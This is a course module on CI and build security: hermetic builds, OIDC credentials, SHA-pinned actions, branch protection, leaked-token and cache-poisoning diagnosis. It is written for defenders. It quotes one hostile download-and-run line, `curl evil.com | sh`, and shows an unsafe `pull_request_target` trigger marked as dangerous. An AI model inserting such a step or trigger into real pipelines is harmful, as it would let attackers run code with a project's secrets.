# Securing the Build & CI

> **Module 07 · Course 30** — Every control in modules 01–06 defends the *output* of your build. This module defends the *build itself*. A hermetic, ephemeral, least-privilege CI pipeline is the difference between a supply-chain attack that stops at your registry and one that starts inside it.

The three SolarWinds-era lessons that shaped modern CI security: (1) a persistent build environment accumulates state an attacker can poison; (2) a static credential is a standing invitation; (3) the most dangerous place in your release pipeline is the human-approved merge on a branch with broad trust.

---

## Hermetic and reproducible builds

### What "hermetic" actually means

A **hermetic build** is one that cannot make network calls during the build step itself. All dependencies are fetched in a separate, auditable *preparation* phase, then the build runs from that fixed set of inputs with network access disabled.

```
Non-hermetic (common today):         Hermetic:
┌──────────────────────┐             ┌─────────────┐   ┌──────────────────────┐
│ RUN pip install -r   │             │ fetch deps  │──▶│ build (no network)   │
│   requirements.txt   │─ network ──▶│ (auditable) │   │ from fixed dep cache │
└──────────────────────┘             └─────────────┘   └──────────────────────┘
```

Why it matters: in a non-hermetic build, `pip install` calls PyPI *at build time*. If PyPI serves a different package version between your test run and your release run — or if a dependency is typosquatted after your lockfile was last updated — the build silently picks up the injected code.

Hermetic builds don't automatically solve lockfile pinning, but they make it enforceable: you *cannot* call out to fetch a new version mid-build.

### Reproducible builds

A **reproducible build** produces byte-for-byte identical output from identical inputs. This lets you independently verify that a published artifact matches a claimed source commit.

Blockers to reproducibility (the common ones):
- Embedded build timestamps (`__DATE__`, `SOURCE_DATE_EPOCH` not set)
- Non-deterministic map/dict iteration in generated files
- Compiler version drift across rebuild environments
- Random UUIDs or temporary filenames embedded in the artifact

```bash
# Set SOURCE_DATE_EPOCH to the git commit time for timestamp determinism
export SOURCE_DATE_EPOCH=$(git log -1 --format=%ct)
docker build --build-arg SOURCE_DATE_EPOCH=$SOURCE_DATE_EPOCH .
```

The [reproducible-builds.org](https://reproducible-builds.org) project maintains a large diffoscope tool to compare two builds byte-by-byte and identify exactly where they diverge.

---

## Ephemeral build environments

A **self-hosted persistent runner** is a machine that processes one build after another, accumulating state: cached credentials, pip/npm/gradle caches, Docker layer caches, SSH keys. If one build is malicious, it can drop files that affect every subsequent build on that runner.

GitHub Actions **GitHub-hosted runners** tear down the VM after each job — clean slate, no cross-job pollution. This is the baseline for SLSA L2: a build service that the developer doesn't control and can't plant state on.

If you must run self-hosted (air-gapped, custom hardware, cost):
- Run each job in a fresh Docker container (`--rm`)
- Never persist the `/root/.npm`, `~/.gradle`, `~/.cache/pip` paths across jobs — use a read-only bind-mount of a pre-validated cache image instead
- Rotate the runner registration token regularly
- Audit with `ps aux` snapshots and filesystem change detection between jobs

```yaml
# Self-hosted runner using ephemeral Docker-in-Docker
jobs:
  build:
    runs-on: [self-hosted, ephemeral]
    container:
      image: ghcr.io/myorg/build-env:sha256-abc123   # pinned to digest
      options: --rm
```

---

## Least-privilege tokens and OIDC

### The static secret problem

A static `AWS_SECRET_ACCESS_KEY` or `DOCKER_PASSWORD` in GitHub Actions Secrets:
- Lives in the repository for months or years
- Can be exfiltrated by any action that runs in the same job
- When it leaks (and it will), requires immediate rotation across all environments

### GitHub Actions OIDC — no static creds

GitHub Actions supports OIDC token exchange: instead of a static secret, the runner requests a short-lived, job-scoped JWT from GitHub's OIDC provider, then exchanges it for cloud credentials.

```yaml
permissions:
  id-token: write     # required to request the OIDC token
  contents: read

jobs:
  deploy:
    runs-on: ubuntu-latest
    steps:
      - name: Configure AWS credentials via OIDC
        uses: aws-actions/configure-aws-credentials@v4   # pinned to tag; use SHA in production
        with:
          role-to-assume: arn:aws:iam::123456789:role/github-actions-deploy
          aws-region: us-east-1

      - name: Push image to ECR
        run: |
          aws ecr get-login-password | docker login --username AWS \
            --password-stdin 123456789.dkr.ecr.us-east-1.amazonaws.com
          docker push 123456789.dkr.ecr.us-east-1.amazonaws.com/myapp:${{ github.sha }}
```

The IAM role's trust policy pins which GitHub repository and branch can assume it:

```json
{
  "Statement": [{
    "Effect": "Allow",
    "Principal": { "Federated": "arn:aws:iam::123456789:oidc-provider/token.actions.githubusercontent.com" },
    "Action": "sts:AssumeRoleWithWebIdentity",
    "Condition": {
      "StringLike": {
        "token.actions.githubusercontent.com:sub": "repo:myorg/myapp:ref:refs/heads/main"
      }
    }
  }]
}
```

The `sub` condition is critical — without it, *any* GitHub Actions job in the world could assume the role.

The same pattern works for GCP (`google-github-actions/auth`), Azure, and cosign keyless signing (where the OIDC token goes to Fulcio instead of a cloud provider).

---

## Pinned actions by SHA

Tags in GitHub Actions are mutable. `uses: actions/checkout@v4` resolves to whatever commit `v4` points to today — if the `actions` org is compromised and `v4` is force-pushed, your next run picks up malicious code.

Pin to the commit SHA:

```yaml
# Vulnerable — tag is mutable
- uses: actions/checkout@v4

# Safe — commit SHA is immutable
- uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683  # v4.2.2
```

The workflow becomes harder to read (long SHA everywhere), but `dependabot` or `renovate` will update the SHA automatically and create a PR you can review. Add the version comment so humans know what they're looking at.

For actions from less-trusted sources (community actions, actions from personal repos):
- Review the action's code before first use
- Pin by SHA, not tag
- Consider vendoring the action into your own org: copy the code, pin to your copy

```bash
# find the SHA for a given tag
gh api repos/actions/checkout/git/refs/tags/v4 \
  --jq '.object.sha'
# -> 11bd71901bbe5b1630ceea73d27597364c9af683
```

---

## Protecting the release path

The release path is the sequence of events that takes code from a developer's commit to a signed artifact in the registry. Every step that a single person controls unilaterally is a SLSA trust boundary.

### Branch protection

```
main branch settings (GitHub):
  ✓ Require a pull request before merging
  ✓ Require 2 approvals
  ✓ Dismiss stale reviews when new commits are pushed
  ✓ Require status checks to pass (your CI jobs)
  ✓ Restrict who can push to matching branches (no force-push)
  ✓ Do not allow bypassing the above settings (even for admins)
```

The last checkbox is the one most teams skip. An admin bypass is a SLSA L2 violation — the provenance can be forged by anyone with org-admin access.

### GitHub Environments for deployment gates

```yaml
jobs:
  deploy-prod:
    environment: production    # requires manual approval + environment secrets
    runs-on: ubuntu-latest
    steps: ...
```

Environment protection rules add a human gate before the production deploy job runs, and scope production secrets (like the prod IAM role ARN) to that environment only — a staging job can't access them.

### CODEOWNERS for the release workflow itself

```
# .github/CODEOWNERS
.github/workflows/release.yml  @myorg/platform-security
```

Any PR that modifies the release workflow requires approval from `platform-security`. This prevents a developer from sneaking in a `curl evil.com | sh` step and having it auto-approved by the normal code review process.

---

## Two-person review

SLSA L2 requires that the provenance be produced by a build service the developer doesn't control. But a developer who can merge their own PR, trigger the release workflow, and push the signed image has effectively self-approved the whole chain.

Two-person review means:
- No self-merges (enforced by branch protection)
- The reviewer is not the same person who wrote the code being reviewed
- For high-risk changes (release workflow, CODEOWNERS, signing keys): require the security/platform team as reviewers

This is a process control, not a technical one — and it's the hardest to enforce consistently. Automated checks help:

```yaml
# require the platform team for any workflow or signing-key change
.github/workflows/         @myorg/platform-security
.github/CODEOWNERS         @myorg/platform-security
signing/                   @myorg/platform-security
```

---

## Debugging the Build Pipeline

Build-level security failures tend to be one of: a token leaked, a cache poisoned, or a runner compromised. Diagnosing them requires correlating CI logs, git history, and artifact metadata.

| Symptom | Likely cause | Fix |
|---------|--------------|-----|
| OIDC exchange fails: `Error assuming role: ... NotAuthorized` | `sub` condition in the IAM trust policy doesn't match the actual job context | Check the JWT claims: add a step that prints `ACTIONS_ID_TOKEN_REQUEST_URL` response; compare `sub` to the trust policy condition |
| OIDC exchange fails: `Error: Credentials could not be loaded` | `permissions: id-token: write` is missing from the job or workflow | Add the permission block; without it, the runner never receives an OIDC token |
| Token appears in CI logs | A step printed the token via `echo $SECRET` or `--build-arg SECRET=...` | Set `::add-mask::` for the value immediately after it's fetched; never pass secrets as `--build-arg`; use BuildKit's `--secret` mount instead |
| Cache hit serving unexpected artifact | Cache key too broad, a previous poisoned run wrote to the same key | Add `hashFiles('**/requirements.txt')` to the cache key so the key changes when deps change; enable `cache: 'immutable'` where supported |
| Self-hosted runner shows unexpected process / file after a malicious PR run | Fork PR had `pull_request_target` trigger without approval gate, writing to the shared runner state | Change to `pull_request` (no write access); add `if: github.event.pull_request.head.repo.full_name == github.repository` guards on sensitive steps |
| Signed artifact digest in Rekor doesn't match the image digest in the registry | Image was re-pushed (tag overwritten) after signing | Always push by digest and verify the digest matches the Rekor entry before deploying |

### Diagnosing a leaked token

```bash
# step 1 — search git history for patterns that suggest a leak
git log --all --diff-filter=A --name-only -- '*.env' '*secret*' '*token*'

# step 2 — check GitHub's secret scanning (if enabled)
gh api repos/{owner}/{repo}/secret-scanning/alerts \
  --jq '.[] | select(.state=="open") | .secret_type + ": " + .html_url'

# step 3 — check if the token was used after the leaked commit
# (in AWS: CloudTrail; GCP: Audit Logs; GitHub: audit log)
gh api orgs/{org}/audit-log \
  --paginate \
  --jq '.[] | select(.action | startswith("authentication")) | .'

# step 4 — rotate immediately, then scope narrower
# For AWS: revoke the key, create a new one, update the OIDC trust policy
# For GitHub PAT: Settings → Developer settings → Personal access tokens → Revoke
```

### Detecting cache poisoning

```bash
# verify that the dependency hash in the lockfile matches what pip actually installed
pip freeze > installed.txt
diff <(sort requirements.txt) <(sort installed.txt)

# for node: compare installed tree to lockfile
npm ci   # uses lockfile exactly — fails if lockfile and package.json diverge
npm audit --audit-level=critical

# for Docker: compare the built image's layer hash against a known-good baseline
docker image inspect myapp:latest \
  --format '{{range .RootFS.Layers}}{{println .}}{{end}}' > current-layers.txt
diff known-good-layers.txt current-layers.txt
```

### The `pull_request_target` trap

This is one of the most consistently exploited CI misconfigurations. `pull_request_target` runs in the context of the *base* repository (with write access and secrets), not the fork. A fork PR can modify workflow files before the run:

```yaml
# DANGEROUS — fork PR can modify release.yml before this runs
on:
  pull_request_target:
    paths: ['**']

# SAFE — fork PR runs in fork context, no write access or secrets
on:
  pull_request:
```

If you need `pull_request_target` for comment/label workflows, never checkout the head ref in the same job that has secret access.

> **War story.** A security researcher reported a cache-poisoning vulnerability to a major open-source project. The project's CI workflow used `pull_request_target` to allow fork PRs to comment with test results. An attacker submitted a PR that modified the `setup.py` to inject a malicious `postinstall` hook. Because `pull_request_target` granted write access and the workflow checked out the head ref, the hook ran in the repo's own CI context, had access to the production signing key, and could write a poisoned cache entry keyed to `requirements.txt`. The next build on `main` that hit the same cache key would install the backdoored package. The immediate fix was switching all fork-facing workflows to `pull_request` and scoping the `pull_request_target` workflows to read-only operations with no checkout of the head ref. The systemic fix was adopting OIDC (eliminating the static signing key) and adding `hashFiles` to every cache key so a modified `setup.py` would produce a different cache key — making the poisoned entry unreachable.

---

## Checkpoint

You're ready for the build-security challenges when you can, without looking anything up:

1. Explain what "hermetic" means in the context of a build, and name the class of attacks it eliminates.
2. Describe the OIDC token exchange for GitHub Actions → AWS. Name the two things you must pin in the IAM trust policy to prevent any GitHub Actions job from assuming the role.
3. Given `uses: actions/checkout@v4`, explain why this is less secure than `uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683`, and name the tool that automates keeping the SHA up to date.
4. Name the three GitHub branch protection settings that are most commonly skipped and explain what each SLSA-level claim they support.
5. Explain the `pull_request_target` vulnerability — what does the trigger grant, and what is the minimal safe guard?
6. A secret appears in CI logs. Name the three immediate steps and the systemic fix.
7. Explain how `hashFiles('**/requirements.txt')` in a cache key defends against cache poisoning, and under what condition an attacker can still bypass it.
8. State the difference between a reproducible build and a hermetic build — can a build be one without the other?

➡ With modules 05–07 done, you have the full supply-chain picture: sign artifacts → enforce at admission → protect the build that produced them. The challenges ahead ask you to implement each layer and verify it holds under adversarial conditions.
